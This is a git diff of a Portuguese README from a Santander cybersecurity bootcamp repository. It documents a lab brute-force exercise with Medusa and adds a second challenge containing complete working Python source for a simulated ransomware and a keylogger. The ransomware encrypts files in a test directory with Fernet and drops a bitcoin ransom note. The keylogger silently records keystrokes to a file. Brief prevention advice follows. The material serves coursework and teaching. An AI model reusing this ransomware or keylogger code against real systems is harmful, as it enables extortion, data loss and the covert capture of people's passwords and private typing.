@@ -1,12 +1,11 @@
 <h1>
   <img src="imagens/santander-bootcamp-logo.png" width="50" style="vertical-align: middle;">
-  Santander - Cibersegurança 2025
+  Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux
 </h1>
-Repositório destinado ao desafio do curso Santander - Cibersegurança 2025.
 
-Este repositório documenta toda a construção de um laboratório e execução dos ataques simulados, utilizando Kali Linux, Metasploitable 2, DVWA, Medusa, Burp Suite e Nmap. O foco do projeto é entender na prática como funcionam ataques de brute-force.
+Repositório destinado aos desafios do curso Santander - Cibersegurança 2025.  
 
-🎯 **Objetivo do Desafio**
+🎯 **Objetivo do primeiro desafio**
 
 O desafio consiste em montar um ambiente controlado e reproduzir ataques comuns solicitados no desafio do curso:  
 ● Brute-force em **FTP**  
@@ -153,4 +152,151 @@ Credencial encontrada:
 
 **user** : **user**  
 
-Neste ataque, o SMB da máquina é vulnerável de propósito, mas esse ataque é muito comum em empresas, especialmente quando usuários tem senhas fracas ou a empresa segue padrões de senha para serviços e contas.
+Neste ataque, o SMB da máquina é vulnerável de propósito, mas esse ataque é muito comum em empresas, especialmente quando usuários tem senhas fracas ou a empresa segue padrões de senha para serviços e contas.  
+
+<h1>
+  <img src="imagens/santander-bootcamp-logo.png" width="50" style="vertical-align: middle;">
+Simulando um Malware de Captura de Dados Simples em Python e Aprendendo a se Proteger
+</h1>
+
+🎯 **Objetivo do segundo desafio**  
+
+O propósito dessa atividade foi entender na prática:  
+● Como ransomwares funcionam  
+● Como keyloggers capturam oque o usuário digita  
+● Como malwares podem ser detectados, mitigados e prevenidos  
+● Como usar o Python para criar malwares em laboratório de teste  
+
+🧪 **Ambiente do Laboratório**
+
+Toda a atividade foi realizada usando:  
+● VM: Kali Linux (VM)  
+
+Ferramentas utilizadas:  
+● Python 3  
+● Bibliotecas cryptography e pynput  
+● Diretório de teste com arquivos falsos para criptografia  
+
+🧩 **Fazendo um Ransomware Simulado**
+
+A primeira atividade demonstra o funcionamento básico de um ransomware, incluindo:  
+● Geração de chave criptográfica  
+● Busca e identificação de arquivos  
+● Criptografia com Fernet  
+● Criação de mensagem para resgate  
+
+Abaixo segue o código usado nas aulas:  
+
+```
+from cryptography.fernet import Fernet
+import os
+
+def gerar_chave():
+    chave = Fernet.generate_key()
+    with open("chave.key", "wb") as chave_file:
+        chave_file.write(chave)
+
+def carregar_chave():
+    return open("chave.key", "rb").read()
+
+def criptografar_arquivo(arquivo, chave):
+    f = Fernet(chave)
+    with open(arquivo, "rb") as file:
+        dados = file.read()
+    dados_criptografados = f.encrypt(dados)
+    with open(arquivo, "wb") as file:
+        file.write(dados_criptografados)
+
+def encontrar_arquivos(diretorio):
+    lista = []
+    for raiz, _, arquivos in os.walk(diretorio):
+        for nome in arquivos:
+            caminho = os.path.join(raiz, nome)
+            if nome != "ransomware.py" and not nome.endswith(".key"):
+                lista.append(caminho)
+    return lista
+
+def criar_mensagem_resgate():
+    with open("LEIA_ISSO.txt", "w") as f:
+        f.write("Seus arquivos foram criptografados!\n")
+        f.write("Envie 1 bitcoin para o endereço X e envie o comprovante.\n")
+
+def main():
+    gerar_chave()
+    chave = carregar_chave()
+    arquivos = encontrar_arquivos("test_files")
+    for arquivo in arquivos:
+        criptografar_arquivo(arquivo, chave)
+    criar_mensagem_resgate()
+    print("Ransomware executado! Arquivos criptografados!")
+
+if __name__ == "__main__":
+    main()
+```
+
+Esse ransomware criado criptografia com algoritmo seguro (Fernet), e faz uma busca automática de arquivos, além de substituição silenciosa do conteúdo e solicitação de regaste por mensagem.  
+
+🧩 **Fazendo um Keylogger Simulado**
+
+A segunda atividade demonstra como os keyloggers podem monitorar tudo que o usuário digita no seu dispositivo infectado. O keylogger possibilita a captura de teclas comuns, caracteres especiais, enter, espaço, tab e ignorar oque você quiser.  
+
+Abaixo segue o código usado nas aulas:  
+
+```
+from pynput import keyboard
+
+IGNORAR = {
+    keyboard.Key.shift,
+    keyboard.Key.shift_r,
+    keyboard.Key.ctrl_l,
+    keyboard.Key.ctrl_r,
+    keyboard.Key.alt_l,
+    keyboard.Key.alt_r,
+    keyboard.Key.caps_lock,
+    keyboard.Key.cmd
+}
+
+def on_press(key):
+    try:
+        with open("log.txt", "a", encoding="utf-8") as f:
+            f.write(key.char)
+    except AttributeError:
+        with open("log.txt", "a", encoding="utf-8") as f:
+            if key == keyboard.Key.space:
+                f.write(" ")
+            elif key == keyboard.Key.enter:
+                f.write("\n")
+            elif key == keyboard.Key.tab:
+                f.write("\t")
+            elif key == keyboard.Key.backspace:
+                f.write("[BACKSPACE]")
+            elif key == keyboard.Key.esc:
+                f.write("[ESC]")
+            elif key in IGNORAR:
+                pass
+            else:
+                f.write(f"[{key}] ")
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+```
+
+O keylogger faz a captura das teclas, registra tudo em log.txt e faz com que não haja janela ou alertas. Nesse exemplo de código, o keylogger ainda possibilita interpretar teclas especiais.  
+
+🧠 **Como se prevenir de um malware**  
+Conforme comentado em aula, as melhores boas práticas para se seguir são:  
+
+**1. Conscientização**  
+● Treinar usuários/colaboradores para que evitem abrir anexos, links ou arquivos suspeitos  
+
+**2. Antivírus / EDR**  
+Os antivírus ou EDRs detectam comportamentos de malware baseado em assinaturas e comportamento, como:  
+● Criptografia em massa  
+● Captura de teclado  
+● Modificação repentina de arquivos  
+
+**3. Sandboxing**  
+● Sempre quando testar arquivos desconhecidos, abri-los em VMs impede que o malware afete a máquina host caso ele seja malicioso  
+
+**4. Firewall**  
+● Bloqueia conexões externas usadas para comunicação com o atacante ou envio de dados capturados  
